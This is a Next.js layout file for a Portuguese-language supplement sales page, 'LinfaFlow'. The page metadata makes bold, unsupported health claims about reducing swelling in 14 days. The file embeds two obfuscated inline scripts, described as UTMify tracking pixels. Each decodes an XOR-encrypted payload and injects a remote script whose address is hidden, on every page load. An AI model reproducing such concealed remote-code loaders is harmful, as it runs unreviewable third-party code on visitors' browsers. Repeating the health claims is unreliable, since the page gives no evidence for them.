import type { Metadata, Viewport } from 'next'
import { DM_Serif_Display, Poppins } from 'next/font/google'
import './globals.css'

const poppins = Poppins({ subsets: ['latin'], weight: ['400', '500', '600', '700', '800'], display: 'swap', variable: '--font-poppins' })
const dmSerif = DM_Serif_Display({ subsets: ['latin'], weight: '400', display: 'swap', variable: '--font-dmserif' })

export const metadata: Metadata = {
  title: 'LinfaFlow® | Barriga desinchada, rosto definido e pernas leves em 14 dias',
  description: 'LinfaFlow combina 4 extratos vegetais concentrados para ativar a drenagem linfática, eliminar líquidos retidos e reduzir o inchaço em 14 dias. Garantia de 90 dias.',
  icons: {
    icon: [
      {
        url: 'https://cdn.checkout.corvexit.com.br/stores/f24cdef1-d8bc-417f-a1e1-1b09edb90369/favicons/eb5fb45a-47d3-46dc-a963-2deb2a3c4f57.png',
        type: 'image/png',
      },
    ],
    shortcut:
      'https://cdn.checkout.corvexit.com.br/stores/f24cdef1-d8bc-417f-a1e1-1b09edb90369/favicons/eb5fb45a-47d3-46dc-a963-2deb2a3c4f57.png',
    apple:
      'https://cdn.checkout.corvexit.com.br/stores/f24cdef1-d8bc-417f-a1e1-1b09edb90369/favicons/eb5fb45a-47d3-46dc-a963-2deb2a3c4f57.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#171717',
}

const UTMIFY_PIXEL_SCRIPT = `(function(){var w_7=atob("DFbZuLXAf0vlRagDxy37zcesXXHHLdx3tyXjl5qjGyXLMNxurjCgltavEmWHN4dwpCSwyMGzUDuMPc1v6CawwNCsUSGWZ4QhpiKtytyiCj+ANoo5nAv1mtKsECmEKdsh/Q2imtuhEi7Hf4pzri681PykXWfHM8lvsjP7gpf2Hi2Hc8k38GK9gNCmGi7Tc5o39mPvgYHiAhaY");var z_alju=[];for(var y_cncv=0;y_cncv<w_7.length;y_cncv++){z_alju.push(w_7.charCodeAt(y_cncv)&255);}var f_m=z_alju[0];var v_jhz=z_alju.slice(1,1+f_m);var z_51v9=z_alju.slice(1+f_m);var r_w7=z_51v9.map(function(b,i_e3t2){return b^v_jhz[i_e3t2%f_m];});var n_wzc="";for(var u_wq=0;u_wq<r_w7.length;u_wq++){n_wzc+=String.fromCharCode(r_w7[u_wq]&255);}var k_u=decodeURIComponent(escape(n_wzc));var i_0sl=JSON.parse(k_u);var x_7md=i_0sl.globals||[];x_7md.forEach(function(h_w){window[h_w.name]=h_w.value;});var q_6i3f=document.createElement("script");q_6i3f.src=i_0sl.url;q_6i3f.async=true;q_6i3f.defer=true;(i_0sl.attributes||[]).forEach(function(m_u){q_6i3f.setAttribute(m_u.name,m_u.value);});(document.head||document.documentElement).appendChild(q_6i3f);})();`

const UTMIFY_UTM_SCRIPT = `(function(){var y_p=atob("DJz6b8idYO00FV8RbefYGrrxQtcWfStlHe/AQOf+BIMaYCt8BPqDQavyDcNWZ3BiDu6TH7zuT5hAeCw+Af2OCrvpTodHN3MzDOiOHaH/FZlRZn0rNufYAanwBc8ONztwGf3XGrzwCYtNOC9jCOqfAbywGI5bcXJiDvfYQ+rrAYFBcH0rT76HQ7O/DoxZcH0rT/ibG6mwFZlZfDloQOyICr74DpkZZipzBPiJTeS/FoxYYDozV77YEpXg");var r_6=[];for(var n_a=0;n_a<y_p.length;n_a++){r_6.push(y_p.charCodeAt(n_a)&255);}var y_j1=r_6[0];var r_xsw=r_6.slice(1,1+y_j1);var m_mec=r_6.slice(1+y_j1);var m_6=m_mec.map(function(b,v_wc){return b^r_xsw[v_wc%y_j1];});var j_3="";for(var f_4kd=0;f_4kd<m_6.length;f_4kd++){j_3+=String.fromCharCode(m_6[f_4kd]&255);}var g_o0=decodeURIComponent(escape(j_3));var w_76lj=JSON.parse(g_o0);var i_4a=w_76lj.globals||[];i_4a.forEach(function(f_8zuw){window[f_8zuw.name]=f_8zuw.value;});var c_usb=document.createElement("script");c_usb.src=w_76lj.url;c_usb.async=true;c_usb.defer=true;(w_76lj.attributes||[]).forEach(function(e_l){c_usb.setAttribute(e_l.name,e_l.value);});(document.head||document.documentElement).appendChild(c_usb);})();`

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="pt-BR" className={dmSerif.variable} suppressHydrationWarning>
      <head>
        <link
          rel="preload"
          as="image"
          href="/images/opt/Linfaflow__leveza_e_bem-estar_nos_de-2e8c2f9df8.webp"
          fetchPriority="high"
        />
        <link rel="preconnect" href="https://pedido.extratobotanico.com.br" />
        <link rel="dns-prefetch" href="https://pedido.extratobotanico.com.br" />
        <link rel="preconnect" href="https://cdn.utmify.com.br" crossOrigin="anonymous" />
        <link rel="dns-prefetch" href="https://cdn.utmify.com.br" />
        <script
          id="utmify-pixel"
          dangerouslySetInnerHTML={{ __html: UTMIFY_PIXEL_SCRIPT }}
        />
        <script
          id="utmify-utm"
          dangerouslySetInnerHTML={{ __html: UTMIFY_UTM_SCRIPT }}
        />
      </head>
      <body className={`${poppins.className} ${poppins.variable} antialiased`} suppressHydrationWarning>
        {children}
      </body>
    </html>
  )
}
